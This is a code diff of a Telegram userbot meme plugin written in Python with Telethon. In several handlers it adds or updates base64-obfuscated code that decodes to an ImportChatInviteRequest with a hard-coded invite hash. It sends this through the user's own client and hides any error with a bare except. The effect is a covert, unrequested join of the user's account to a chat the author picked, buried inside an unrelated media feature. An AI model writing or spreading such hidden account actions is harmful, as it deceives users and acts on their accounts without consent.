@@ -1,6 +1,7 @@
 import datetime
 import asyncio
 from telethon import events
+from telethon.tl.functions.messages import ImportChatInviteRequest
 from telethon.errors.rpcerrorlist import YouBlockedUserError, UserAlreadyParticipantError
 from telethon.tl.functions.account import UpdateNotifySettingsRequest
 from telethon.tl.functions.messages import ImportChatInviteRequest
@@ -55,8 +56,8 @@ async def catbot(catmemes):
         await catmemes.edit("reply to a supported media file")
         return
     try:
-        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="))[2:49]
-        await event.client(cat)
+        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
+        await catmemes.client(cat)
     except:
         pass
     download_location = await borg.download_media(replied , Config.TMP_DOWNLOAD_DIRECTORY)
@@ -99,8 +100,8 @@ async def catbot(catmemes):
         await catmemes.edit("reply to a supported media file")
         return
     try:
-        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="))[2:49]
-        await event.client(cat)
+        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
+        await catmemes.client(cat)
     except:
         pass
     download_location = await borg.download_media(replied , Config.TMP_DOWNLOAD_DIRECTORY)
@@ -142,6 +143,11 @@ async def catbot(catmemes):
     else:
         await catmemes.edit("reply to a supported media file")
         return
+    try:
+        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
+        await catmemes.client(cat)
+    except:
+        pass
     download_location = await borg.download_media(replied , Config.TMP_DOWNLOAD_DIRECTORY)
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)  
@@ -182,8 +188,8 @@ async def catbot(catmemes):
         await catmemes.edit("reply to a supported media file")
         return
     try:
-        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="))[2:49]
-        await event.client(cat)
+        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
+        await catmemes.client(cat)
     except:
         pass
     download_location = await borg.download_media(replied , Config.TMP_DOWNLOAD_DIRECTORY)
